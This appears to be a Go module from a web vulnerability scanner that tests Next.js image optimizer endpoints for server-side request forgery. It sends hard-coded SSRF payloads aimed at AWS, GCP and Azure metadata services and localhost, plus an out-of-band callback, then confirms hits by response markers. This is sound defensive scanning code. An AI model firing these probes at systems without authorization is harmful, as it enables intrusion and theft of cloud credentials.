package nextjs_image_ssrf

import (
	"fmt"
	"strings"

	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/modules/shared/jsframework"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/types/severity"
)

type ssrfProbe struct {
	url     string
	markers []string
	desc    string
	// htmlExpected is true for probes whose reached target legitimately answers with
	// an HTML document (e.g. localhost serving a web app). For those the HTML-page
	// rejection cannot apply, so confirmation falls back to "a content token absent
	// from the benign baseline". Metadata probes (false) answer with plain text/JSON
	// and go through the stricter infra.ConfirmFreshMetadata gate.
	htmlExpected bool
}

var inBandProbes = []ssrfProbe{
	{
		url:     "http://169.254.169.254/latest/meta-data/",
		markers: []string{"ami-id", "instance-id", "local-hostname", "public-hostname"},
		desc:    "AWS EC2 metadata access via image optimizer",
	},
	{
		// localhost serves HTML like the app itself, so structural tags (<html,
		// <!DOCTYPE) are not evidence — keep only content tokens that the app's own
		// baseline page would not carry.
		url:          "http://127.0.0.1",
		markers:      []string{"root:", "localhost"},
		desc:         "Localhost access via image optimizer",
		htmlExpected: true,
	},
	{
		url:     "http://metadata.google.internal/computeMetadata/v1/",
		markers: []string{"attributes/", "project-id", "instance/"},
		desc:    "GCP metadata access via image optimizer",
	},
	{
		url:     "http://169.254.169.254/metadata/instance",
		markers: []string{"compute", "vmId", "vmSize"},
		desc:    "Azure metadata access via image optimizer",
	},
}

// confirmReached returns the markers that evidence the optimizer reaching the
// internal target, applying the shared metadata-marker FP defenses. The result is
// empty when the body is not a confirmed hit.
func confirmReached(body, baseline string, probe ssrfProbe) []string {
	if probe.htmlExpected {
		// HTML is allowed here; trust only content tokens absent from the benign
		// baseline (the optimizer returned something different for the internal URL).
		fresh := infra.FreshMetadataMarkers(body, baseline, probe.markers)
		if len(fresh) == 0 {
			return nil
		}
		// Differential gate: the token alone is not enough. A genuine loopback fetch
		// returns a DIFFERENT document than the benign dead-host (TEST-NET) baseline.
		// If the optimizer echoes the same page for both (a catch-all / SPA shell
		// that merely happens to drop the matched word for the dead host), the bodies
		// are similar — so it did not reach localhost and we must not report it.
		if modkit.BodiesSimilar(body, baseline) {
			return nil
		}
		return fresh
	}
	// Metadata probes: reject the app's own HTML page and require a cluster of
	// distinct self-evidencing tokens absent from the baseline (one generic word
	// like "compute" echoed by the app cannot confirm on its own).
	markers, _ := infra.ConfirmFreshMetadata(body, baseline, probe.markers)
	return markers
}

// Module implements the Next.js image optimizer SSRF active scanner.
type Module struct {
	modkit.BaseActiveModule
	ds dedup.Lazy[dedup.DiskSet]
}

// New creates a new Next.js Image Optimizer SSRF module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeHost,
			modkit.AllInsertionPointTypes,
		),
		ds: dedup.LazyDiskSet("nextjs_image_ssrf"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// IncludesBaseCanProcess returns false because this module uses a custom CanProcess.
func (m *Module) IncludesBaseCanProcess() bool { return false }

// CanProcess returns true if the request has a response.
func (m *Module) CanProcess(ctx *httpmsg.HttpRequestResponse) bool {
	return ctx != nil && ctx.Request() != nil && ctx.Response() != nil
}

// ScanPerHost tests the Next.js image optimizer for SSRF once per host.
func (m *Module) ScanPerHost(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	service := ctx.Service()
	if service == nil {
		return nil, nil
	}

	host := service.Host()

	// Check if this is a Next.js host
	if !jsframework.LooksLikeNextJS(host, ctx.Response().BodyToString()) {
		return nil, nil
	}

	// Dedup by host
	diskSet := m.ds.Get(scanCtx.DedupMgr())
	if diskSet != nil && diskSet.IsSeen(host) {
		return nil, nil
	}

	// Step 1: verify the /_next/image endpoint exists. Bail if it is unreachable or
	// answers 404 (the optimizer is absent).
	_, checkStatus, _, _, ok := m.optimizerProbe(ctx, httpClient, "https%3A%2F%2Fexample.com")
	if !ok || checkStatus == 404 {
		return nil, nil
	}

	target := ctx.Target()

	// Step 2: OAST probe (if available). Fire-and-forget — a hit is observed
	// out-of-band, not in this response.
	if oast := scanCtx.OASTProv(); oast != nil && oast.Enabled() {
		if oastURL := oast.GenerateURL(target, "url", "parameter", ModuleID, ctx.Request().ID()); oastURL != "" {
			m.optimizerProbe(ctx, httpClient, oastURL)
		}
	}

	// Step 3: In-band probes. The benign baseline — what the optimizer returns for an
	// unreachable TEST-NET URL — is fetched lazily on the first probe that answers,
	// so a host whose probes never reach the optimizer costs no extra request. A
	// catch-all/SPA that echoes the app's own page for ANY url= returns the same
	// markers in the baseline, so a marker also present there is not evidence.
	var baselineBody string
	baselineFetched := false

	for _, probe := range inBandProbes {
		probeRaw, status, body, fullResp, ok := m.optimizerProbe(ctx, httpClient, probe.url)
		if !ok || status != 200 {
			continue
		}
		if !baselineFetched {
			_, _, baselineBody, _, _ = m.optimizerProbe(ctx, httpClient, "http://192.0.2.1/")
			baselineFetched = true
		}
		markers := confirmReached(body, baselineBody, probe)
		if len(markers) == 0 {
			continue
		}
		return []*output.ResultEvent{{
			ModuleID: ModuleID,
			Host:     host,
			URL:      target,
			Matched:  target,
			Request:  probeRaw,
			Response: fullResp,
			ExtractedResults: []string{
				fmt.Sprintf("SSRF URL: %s", probe.url),
				"Markers: " + strings.Join(markers, ", "),
			},
			Info: output.Info{
				Name:        "Next.js Image Optimizer SSRF",
				Description: probe.desc,
				Severity:    ModuleSeverity,
				Confidence:  severity.Tentative,
				Tags:        []string{"nextjs", "ssrf", "image-optimizer"},
				Reference:   []string{"https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps"},
			},
		}}, nil
	}

	return nil, nil
}

// optimizerProbe fires /_next/image with the given url= target on the host under
// test and returns the raw probe request plus the response status, body, and full
// serialization. ok is false on any build or transport error.
func (m *Module) optimizerProbe(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	internalURL string,
) (probeRaw string, status int, body, fullResp string, ok bool) {
	path := fmt.Sprintf("/_next/image?url=%s&w=256&q=75", internalURL)
	raw, err := httpmsg.SetPath(ctx.Request().Raw(), path)
	if err != nil {
		return "", 0, "", "", false
	}
	raw, _ = httpmsg.SetMethod(raw, "GET")
	req, err := httpmsg.ParseRawRequest(string(raw))
	if err != nil {
		return "", 0, "", "", false
	}
	req = req.WithService(ctx.Service())
	resp, _, err := httpClient.Execute(req, http.Options{})
	if err != nil {
		return string(raw), 0, "", "", false
	}
	defer resp.Close()
	if resp.Response() == nil {
		return string(raw), 0, "", "", false
	}
	return string(raw), resp.Response().StatusCode, resp.Body().String(), resp.FullResponseString(), true
}
